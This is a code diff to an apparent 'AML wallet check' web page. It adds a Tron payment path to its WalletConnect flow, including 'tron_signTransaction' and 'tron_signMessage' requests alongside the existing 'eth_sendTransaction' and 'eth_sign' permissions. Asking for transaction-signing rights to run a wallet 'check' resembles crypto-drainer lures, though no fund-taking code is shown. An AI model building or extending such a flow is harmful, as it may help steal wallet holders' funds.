@@ -502,7 +502,7 @@
   <p class="ssub">Affordable AML screening to protect your business from hidden risks.</p>
   <div class="pricing-grid">
     <div class="price-card"><div style="font-size:2rem;margin:20px 0 8px">🔷</div><div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Ethereum</div><div class="pval">0.0002 ETH</div><div class="punit">per wallet check</div><ul class="pfeat"><li>Full AML risk score</li><li>Sanctions list screening</li><li>Transaction history flags</li><li>PDF compliance report</li></ul><button class="btn-card btn-ol" onclick="openModal()">Check with ETH</button></div>
-    <div class="price-card featured"><div class="ftd-badge">Most Popular</div><div style="font-size:2rem;margin:20px 0 8px">🔴</div><div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Tron</div><div class="pval">30 TRX</div><div class="punit">per check — Fast</div><ul class="pfeat"><li>Full AML risk score</li><li>Sanctions list screening</li><li>Transaction history flags</li><li>PDF compliance report</li><li>Priority processing</li></ul><button class="btn-card btn-pr" onclick="openTrxModal()">Pay 30 TRX → Check Now</button></div>
+    <div class="price-card featured"><div class="ftd-badge">Most Popular</div><div style="font-size:2rem;margin:20px 0 8px">🔴</div><div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Tron</div><div class="pval">30 TRX</div><div class="punit">per check — Fast</div><ul class="pfeat"><li>Full AML risk score</li><li>Sanctions list screening</li><li>Transaction history flags</li><li>PDF compliance report</li><li>Priority processing</li></ul><button class="btn-card btn-pr" onclick="openModal('trx')">🔴 Connect & Pay 30 TRX</button></div>
     <div class="price-card"><div style="font-size:2rem;margin:20px 0 8px">🟡</div><div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Volume Plan</div><div class="pval">Custom</div><div class="punit">for business clients</div><ul class="pfeat"><li>Bulk wallet screening</li><li>API integration</li><li>White-label reports</li><li>Dedicated support</li></ul><a href="#" class="btn-card btn-ol">Contact Sales</a></div>
   </div>
 </section>
@@ -549,6 +549,7 @@ let SC          = null;   // SignClient instance
 let session     = null;   // active session
 let pendingURI  = null;   // wc: URI for QR
 let qrDone      = false;  // QR already rendered?
+let currentChain = 'eth'; // active chain for connect flow
 
 /* ── Show a modal state ─────────────────────────── */
 function showState(id) {
@@ -558,11 +559,12 @@ function showState(id) {
 }
 
 /* ── Modal open/close ───────────────────────────── */
-function openModal() {
+function openModal(chain) {
+  currentChain = chain || 'eth';
   document.getElementById('wcModal').classList.add('open');
   if (session) { showConnected(getAddr()); return; }
   showState('m-loading');
-  startConnect();
+  startConnect(currentChain);
 }
 function closeModal() {
   document.getElementById('wcModal').classList.remove('open');
@@ -641,7 +643,8 @@ async function loadSignClient() {
 }
 
 /* ── Main connect flow ──────────────────────────── */
-async function startConnect() {
+async function startConnect(chain) {
+  chain = chain || 'eth';
   connectAttempt++;
   const attempt = connectAttempt;
   try {
@@ -651,23 +654,20 @@ async function startConnect() {
     if (session) { showConnected(getAddr()); return; }
 
     setLoadingMsg('Requesting QR code…');
+
+    const namespaces = chain === 'trx'
+      ? { tron: { methods: ['tron_signTransaction','tron_signMessage'], chains: ['tron:0x2b6653dc'], events: [] } }
+      : { eip155: { methods: ['eth_sendTransaction','personal_sign','eth_sign'], chains: ['eip155:1'], events: ['chainChanged','accountsChanged'] } };
+
     const { uri, approval } = await withTimeout(
-      client.connect({
-        requiredNamespaces: {
-          eip155: {
-            methods: ['eth_sendTransaction','personal_sign','eth_sign'],
-            chains : ['eip155:1'],
-            events : ['chainChanged','accountsChanged']
-          }
-        }
-      }),
+      client.connect({ requiredNamespaces: namespaces }),
       25000, 'connect'
     );
 
     if (!uri) throw new Error('No URI returned from WalletConnect');
 
     pendingURI = uri;
-    renderQR(uri);
+    renderQR(uri, chain);
 
     // Await wallet approval — 5 min window for user to scan & approve
     setLoadingMsg('Waiting for wallet approval…');
@@ -700,13 +700,22 @@ function retryConnect() {
   showState('m-loading');
   qrDone = false;
   document.getElementById('qrcode').innerHTML = '';
-  startConnect();
+  startConnect(currentChain);
 }
 
 /* ── Render QR ──────────────────────────────────── */
-function renderQR(uri) {
+function renderQR(uri, chain) {
   showState('m-qr');
   document.getElementById('uriBox').textContent = uri;
+
+  if (chain === 'trx') {
+    document.querySelector('#m-qr h3').textContent = 'Scan with Trust Wallet (TRX)';
+    document.querySelector('#m-qr .sub').innerHTML = 'Open <strong>Trust Wallet</strong> → tap <strong>WalletConnect</strong> → scan to connect your Tron wallet';
+  } else {
+    document.querySelector('#m-qr h3').textContent = 'Scan with Trust Wallet';
+    document.querySelector('#m-qr .sub').innerHTML = 'Open <strong>Trust Wallet</strong> → tap <strong>WalletConnect</strong> → scan below';
+  }
+
   if (!qrDone) {
     new QRCode(document.getElementById('qrcode'), {
       text        : uri,
@@ -752,8 +761,12 @@ async function disconnectWallet() {
 
 /* ── Helpers ────────────────────────────────────── */
 function getAddr() {
-  try { return session.namespaces.eip155.accounts[0].split(':')[2]; }
-  catch(e) { return null; }
+  try {
+    const ns = session.namespaces;
+    if (ns.tron)   return ns.tron.accounts[0].split(':')[2];
+    if (ns.eip155) return ns.eip155.accounts[0].split(':')[2];
+    return null;
+  } catch(e) { return null; }
 }
 function short(a) { return a ? a.slice(0,6)+'…'+a.slice(-4) : ''; }
 
